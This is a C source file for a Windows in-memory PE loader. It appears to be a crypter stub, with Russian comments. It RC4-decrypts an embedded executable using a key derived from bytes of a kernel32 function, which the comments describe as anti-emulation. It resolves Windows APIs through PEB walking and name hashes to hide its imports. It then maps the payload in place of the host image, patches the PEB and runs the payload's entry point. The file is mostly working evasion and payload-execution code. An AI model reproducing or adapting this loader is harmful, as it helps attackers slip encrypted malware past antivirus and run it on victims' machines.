#include <Windows.h>
#include <iostream>
#include <lm.h>
#include <stdio.h>
#include <stdint.h>

#include "../LoadPe.h"
#include "../ntddk.h"

#pragma optimize( "", off )

typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

typedef struct {
	TCHAR* pTargetPath;
	PIMAGE_DOS_HEADER		pDosHeader;
	PIMAGE_NT_HEADERS		pNtHeaders;
	DWORD_PTR				dwImage;
	DWORD					dwImageSizeOnDisk;
	DWORD_PTR				dwLoaderBase;
	DWORD_PTR				dwLoaderRelocatedBase;
	DWORD_PTR				dwMapBase;
} PE_LDR_PARAM;


#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

BOOL PeLdrRunImage(PE_LDR_PARAM* pe);
BOOL PeLdrLoadImage(PE_LDR_PARAM* pe);
DWORD_PTR get_kernel32base();
DWORD_PTR get_ntdllbase();
DWORD get_hash(const char* str);
DWORD_PTR get_proc_address(DWORD_PTR pDLL, DWORD dwAPI);

#define swap(type,a,b,c) do{type t=a[b];a[b]=a[c];a[c]=t;}while(0)
void WINAPI LoadPE_Start(PBYTE lpFile, DWORD szFile)
{

	PE_LDR_PARAM te;
	PE_LDR_PARAM* pe = &te;

	DWORD_PTR hKernel32 = get_kernel32base();
	LPVOID(WINAPI * pVirtualAlloc)(__in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect);
	*(DWORD_PTR*)&pVirtualAlloc = get_proc_address(hKernel32, 0x302ebe1c);
	BYTE* s = (BYTE*)pVirtualAlloc(NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	//Антиэиуляция для получения ключа
	//0x9c18442b - Close
	DWORD_PTR func = get_proc_address(hKernel32, 0x9c18442b);
	DWORD_PTR tr = (DWORD_PTR)func;
	tr = ((PBYTE)tr)[6] - 1;

	uint8_t key = (uint8_t)tr;
	key = lpFile[szFile - 1] + key;

	uint8_t key_to_dec[4];
	key_to_dec[0] = key + 1;
	key_to_dec[1] = key + 2;
	key_to_dec[2] = key + 3;
	key_to_dec[3] = key + 4;

	//Тут будет расшифровка кода
	DWORD i, j, c;
	int gg;
	gg = 256;
	DWORD dwDataLen = szFile - 1;

	for (i = 0; i < gg; s[i] = (BYTE)i++);

	for (i = j = 0; i < gg; ++i)
	{
		j = (j + s[i] + key_to_dec[i % 4]) % gg;
		swap(BYTE, s, i, j);
	}

	i = j = c = 0;

	while (dwDataLen--)
	{
		j = (j + s[i = (i + 1) % gg]) % gg;
		swap(BYTE, s, i, j);
		lpFile[c++] ^= s[(s[i] + s[j]) % gg];
	}

	DWORD_PTR hNtdll = get_ntdllbase();
	pe->dwImageSizeOnDisk = szFile;
	pe->dwImage = (DWORD_PTR)lpFile;
	if (!PeLdrLoadImage(pe)) return;
	PeLdrRunImage(pe);
}

// получение через PEB хэндла kernel32.dll
static DWORD_PTR get_kernel32base()
{
	void* vp;
#ifndef WIN64
	PPEB peb = (PPEB)__readfsdword(0x30);
	DWORD test = (DWORD)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink->Flink + 0x10;
	vp = *(void**)test;
#else
	PPEB peb = (PPEB)__readgsqword(0x60);
	DWORD64 test = (DWORD64)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink->Flink + 0x20;
	vp = *(void**)test;
#endif
	return (DWORD_PTR)vp;
}

// получение через PEB хэндла ntdll.dll
static DWORD_PTR get_ntdllbase()
{
	void* vp;
#ifndef WIN64
	PPEB peb = (PPEB)__readfsdword(0x30);
	DWORD test = (DWORD)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink + 0x10;
	vp = *(void**)test;
#else
	PPEB peb = (PPEB)__readgsqword(0x60);
	DWORD64 test = (DWORD64)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink + 0x20;
	vp = *(void**)test;
#endif
	return (DWORD_PTR)vp;
}

// получение хеша
static DWORD get_hash(const char* str) {
	DWORD h;
	h = 0;
	while (*str) {
		h = (h >> 13) | (h << (32 - 13));       // ROR h, 13
		h += *str >= 'a' ? *str - 32 : *str;    // конвертирует символы в верхний регистр
		str++;
	}
	return h;
}

// получение адреса функции в длл
static DWORD_PTR get_proc_address(DWORD_PTR pDLL, DWORD dwAPI)
{
	IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)pDLL;
	IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)((BYTE*)pDLL + pIDH->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* pIED = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDLL + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD* dwNames = (DWORD*)((BYTE*)pDLL + pIED->AddressOfNames);
	DWORD* dwFunctions = (DWORD*)((BYTE*)pDLL + pIED->AddressOfFunctions);
	WORD* wNameOrdinals = (WORD*)((BYTE*)pDLL + pIED->AddressOfNameOrdinals);
	for (DWORD i = 0; i < pIED->NumberOfNames; i++)
	{
		if (get_hash((char*)((BYTE*)pDLL + dwNames[i])) == dwAPI)
		{
			return (DWORD_PTR)((BYTE*)pDLL + dwFunctions[wNameOrdinals[i]]);
		}
	}

	return 0;
}

static BOOL PeLdrApplyImageRelocations(DWORD_PTR dwImageBase, UINT_PTR iRelocOffset)
{
	PIMAGE_DOS_HEADER			pDosHeader;
	PIMAGE_NT_HEADERS			pNtHeaders;
	DWORD_PTR					x;
	DWORD_PTR					dwTmp;
	PIMAGE_BASE_RELOCATION		pBaseReloc;
	PIMAGE_RELOC				pReloc;
	pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;
	pNtHeaders = (PIMAGE_NT_HEADERS)(dwImageBase + pDosHeader->e_lfanew);
	pBaseReloc = (PIMAGE_BASE_RELOCATION)(dwImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	while (pBaseReloc->SizeOfBlock) {
		x = dwImageBase + pBaseReloc->VirtualAddress;
		dwTmp = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
		pReloc = (PIMAGE_RELOC)(((DWORD_PTR)pBaseReloc) + sizeof(IMAGE_BASE_RELOCATION));
		while (dwTmp--) {
			switch (pReloc->type) {
			case IMAGE_REL_BASED_DIR64:
				*((UINT_PTR*)(x + pReloc->offset)) += iRelocOffset;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(x + pReloc->offset)) += (DWORD)iRelocOffset;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(x + pReloc->offset)) += HIWORD(iRelocOffset);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(x + pReloc->offset)) += LOWORD(iRelocOffset);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				break;
			}
			pReloc += 1;
		}
		pBaseReloc = (PIMAGE_BASE_RELOCATION)(((DWORD_PTR)pBaseReloc) + pBaseReloc->SizeOfBlock);
	}
	return TRUE;
}

static BOOL PeLdrProcessIAT(DWORD_PTR dwImageBase)
{
	BOOL						ret = FALSE;
	PIMAGE_DOS_HEADER			pDosHeader;
	PIMAGE_NT_HEADERS			pNtHeaders;
	PIMAGE_IMPORT_DESCRIPTOR	pImportDesc;
	PIMAGE_THUNK_DATA			pThunkData;
	PIMAGE_THUNK_DATA			pThunkDataOrig;
	PIMAGE_IMPORT_BY_NAME		pImportByName;
	PIMAGE_EXPORT_DIRECTORY		pExportDir;
	DWORD						flError;
	DWORD_PTR					dwTmp;
	BYTE* pLibName;
	HMODULE						hMod;
	DWORD_PTR hKernel32 = get_kernel32base();
	HMODULE(WINAPI * pLoadLibraryA)(LPCSTR lpLibFileName) = 0;
	*(DWORD_PTR*)&pLoadLibraryA = get_proc_address(hKernel32, 0x8a8b4676);
	FARPROC(WINAPI * pGetProcAddress)(__in HMODULE hModule, __in LPCSTR lpProcName);
	*(DWORD_PTR*)&pGetProcAddress = get_proc_address(hKernel32, 0x1acaee7a);
	flError = 0;
	pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;
	pNtHeaders = (PIMAGE_NT_HEADERS)(dwImageBase + pDosHeader->e_lfanew);
	do {
		pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(dwImageBase +
			pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		if (!pImportDesc) break;
		while ((pImportDesc->Name != 0) && (!flError)) {
			pLibName = (BYTE*)(dwImageBase + pImportDesc->Name);
			if (pImportDesc->ForwarderChain != -1) {
			}
			hMod = pLoadLibraryA((CHAR*)pLibName);
			if (!hMod) {
				flError = 1;
				break;
			}
			pThunkData = (PIMAGE_THUNK_DATA)(dwImageBase + pImportDesc->FirstThunk);
			if (pImportDesc->Characteristics == 0)
				pThunkDataOrig = pThunkData;
			else
				pThunkDataOrig = (PIMAGE_THUNK_DATA)(dwImageBase + pImportDesc->Characteristics);

			while (pThunkDataOrig->u1.AddressOfData != 0) {
				if (pThunkDataOrig->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
					PIMAGE_DOS_HEADER		_dos;
					PIMAGE_NT_HEADERS		_nt;
					_dos = (PIMAGE_DOS_HEADER)hMod;
					_nt = (PIMAGE_NT_HEADERS)(((DWORD_PTR)hMod) + _dos->e_lfanew);
					pExportDir = (PIMAGE_EXPORT_DIRECTORY)(((DWORD_PTR)hMod) + _nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
					dwTmp = (((DWORD_PTR)hMod) + pExportDir->AddressOfFunctions) + (((IMAGE_ORDINAL(pThunkDataOrig->u1.Ordinal) - pExportDir->Base)) * sizeof(DWORD_PTR));
					dwTmp = ((DWORD_PTR)hMod) + *((DWORD_PTR*)dwTmp);
					pThunkData->u1.Function = dwTmp;
				}
				else {
					pImportByName = (PIMAGE_IMPORT_BY_NAME)(dwImageBase + pThunkDataOrig->u1.AddressOfData);
					pThunkData->u1.Function = (DWORD_PTR)pGetProcAddress(hMod, (LPCSTR)pImportByName->Name);
					if (!pThunkData->u1.Function) {
						flError = 1;
						break;
					}
				}
				pThunkDataOrig++;
				pThunkData++;
			}
			pImportDesc++;
		}
		if (!flError) ret = TRUE;
	} while (0);
	return ret;
}



static BOOL PeLdrExecuteEP(PE_LDR_PARAM* pe)
{
	DWORD		dwOld;
	DWORD_PTR	dwEP;
	PPEB		peb;
	DWORD_PTR hKernel32 = get_kernel32base();
	BOOL(WINAPI * pVirtualProtect)(__in  LPVOID lpAddress, __in  SIZE_T dwSize, __in  DWORD flNewProtect, __out PDWORD lpflOldProtect);
	*(DWORD_PTR*)&pVirtualProtect = get_proc_address(hKernel32, 0x1803b7e3);
	if (!pVirtualProtect((LPVOID)pe->dwMapBase, pe->pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &dwOld)) return FALSE;
#ifndef WIN64
	peb = (PPEB)__readfsdword(0x30);
#else
	peb = (PPEB)__readgsqword(0x60);
#endif
	peb->ImageBaseAddress = (PVOID)pe->dwMapBase;
	dwEP = pe->dwMapBase + pe->pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	(*(void(*)())dwEP)();
	return TRUE;
}

BOOL PeLdrApplyRelocations(PE_LDR_PARAM* pe)
{
	UINT_PTR	iRelocOffset;
	if (pe->dwMapBase == pe->pNtHeaders->OptionalHeader.ImageBase) return TRUE;
	if (!pe->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) return FALSE;
	iRelocOffset = pe->dwMapBase - pe->pNtHeaders->OptionalHeader.ImageBase;
	return PeLdrApplyImageRelocations(pe->dwMapBase, iRelocOffset);
}


static BOOL PeLdrMapImage(PE_LDR_PARAM* pe)
{
	SIZE_T						i;
	MEMORY_BASIC_INFORMATION	mi;
	PIMAGE_SECTION_HEADER		pSectionHeader;
	BOOL						ret;
	DWORD_PTR hKernel32 = get_kernel32base();
	LPVOID(WINAPI * pVirtualAlloc)(__in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect);
	*(DWORD_PTR*)&pVirtualAlloc = get_proc_address(hKernel32, 0x302ebe1c);
	BOOL(WINAPI * pVirtualProtect)(__in  LPVOID lpAddress, __in  SIZE_T dwSize, __in  DWORD flNewProtect, __out PDWORD lpflOldProtect);
	*(DWORD_PTR*)&pVirtualProtect = get_proc_address(hKernel32, 0x1803b7e3);
	HANDLE(WINAPI * pGetCurrentProcess)(VOID);
	*(DWORD_PTR*)&pGetCurrentProcess = get_proc_address(hKernel32, 0x1a4b89aa);
	SIZE_T(WINAPI * pVirtualQuery)(__in_opt LPCVOID lpAddress, __out_bcount_part(dwLength, return) PMEMORY_BASIC_INFORMATION lpBuffer, __in SIZE_T dwLength);
	*(DWORD_PTR*)&pVirtualQuery = get_proc_address(hKernel32, 0x4247bc72);
	DWORD_PTR hNtdll = get_ntdllbase();
	NTSTATUS(NTAPI * pNtUnmapViewOfSection) (HANDLE, LPVOID) = NULL;
	*(DWORD_PTR*)&pNtUnmapViewOfSection = get_proc_address(hNtdll, 0x996cc394);
	void* (__cdecl * pmemcpy)(_Out_writes_bytes_all_(_Size) void* _Dst, _In_reads_bytes_(_Size) const void* _Src, _In_ size_t _Size);
	*(DWORD_PTR*)&pmemcpy = get_proc_address(hNtdll, 0x1c846140);

	ret = FALSE;
	if (!pe) return ret;
	do {
		i = pe->dwLoaderBase;
		while (pVirtualQuery((LPVOID)i, &mi, sizeof(mi))) {
			if (mi.State == MEM_FREE) break;
			i += mi.RegionSize;
		}

		if ((pe->pNtHeaders->OptionalHeader.ImageBase >= pe->dwLoaderBase) &&
			(pe->pNtHeaders->OptionalHeader.ImageBase < i)) {
			if (pNtUnmapViewOfSection) {
				if (pNtUnmapViewOfSection(pGetCurrentProcess(), (VOID*)pe->dwLoaderBase) == STATUS_SUCCESS) {
					pe->dwMapBase = (DWORD_PTR)pVirtualAlloc((LPVOID)pe->pNtHeaders->OptionalHeader.ImageBase, pe->pNtHeaders->OptionalHeader.SizeOfImage + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				};
			}
		}

		pe->dwMapBase = (DWORD_PTR)pVirtualAlloc((LPVOID)(pe->pNtHeaders->OptionalHeader.ImageBase), pe->pNtHeaders->OptionalHeader.SizeOfImage + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!pe->dwMapBase) {
			DWORD old;
			if (pVirtualProtect((LPVOID)pe->pNtHeaders->OptionalHeader.ImageBase, pe->pNtHeaders->OptionalHeader.SizeOfImage + 1, PAGE_EXECUTE_READWRITE, &old))
			{
				pe->dwMapBase = (DWORD_PTR)pe->pNtHeaders->OptionalHeader.ImageBase;
			}
		};


		if (!pe->dwMapBase) {
				if (!pe->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
					pe->dwMapBase = (DWORD_PTR)pe->pNtHeaders->OptionalHeader.ImageBase;
				}
				else {
					pe->dwMapBase = (DWORD_PTR)pVirtualAlloc((LPVOID)(0x400000), pe->pNtHeaders->OptionalHeader.SizeOfImage + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				}
		}

		if (!pe->dwMapBase) break;
		pmemcpy((LPVOID)pe->dwMapBase, (LPVOID)pe->dwImage, pe->pNtHeaders->OptionalHeader.SizeOfHeaders);
		pSectionHeader = IMAGE_FIRST_SECTION(pe->pNtHeaders);
		for (i = 0; i < pe->pNtHeaders->FileHeader.NumberOfSections; i++) {
			pmemcpy((LPVOID)(pe->dwMapBase + pSectionHeader[i].VirtualAddress), (LPVOID)(pe->dwImage + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData);
		}
		ret = TRUE;
	} while (0);
	return ret;
}

static BOOL PeLdrLoadImage(PE_LDR_PARAM* pe)
{
	BOOL	ret;
	PPEB	peb;
	ret = FALSE;
	if (!pe) goto out;
	pe->pDosHeader = (PIMAGE_DOS_HEADER)pe->dwImage;
	if (pe->pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) goto out;
	pe->pNtHeaders = (PIMAGE_NT_HEADERS)(((DWORD_PTR)pe->dwImage) + pe->pDosHeader->e_lfanew);
	if (pe->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) goto out;
#ifndef WIN64
	peb = (PPEB)__readfsdword(0x30);
#else
	peb = (PPEB)__readgsqword(0x60);
#endif
	pe->dwLoaderBase = (DWORD_PTR)peb->ImageBaseAddress;
	ret = TRUE;
out:
	return ret;
}

static BOOL PeLdrRunImage(PE_LDR_PARAM* pe)
{
	if (!PeLdrMapImage(pe)) return 12;
	if (!PeLdrProcessIAT(pe->dwMapBase)) return 2;
	if (!PeLdrApplyRelocations(pe))	return 3;
	if (!PeLdrExecuteEP(pe)) return 4;
	return TRUE;
}


void WINAPI LoadPE_End()
{
	return;
}

#pragma optimize( "", on )
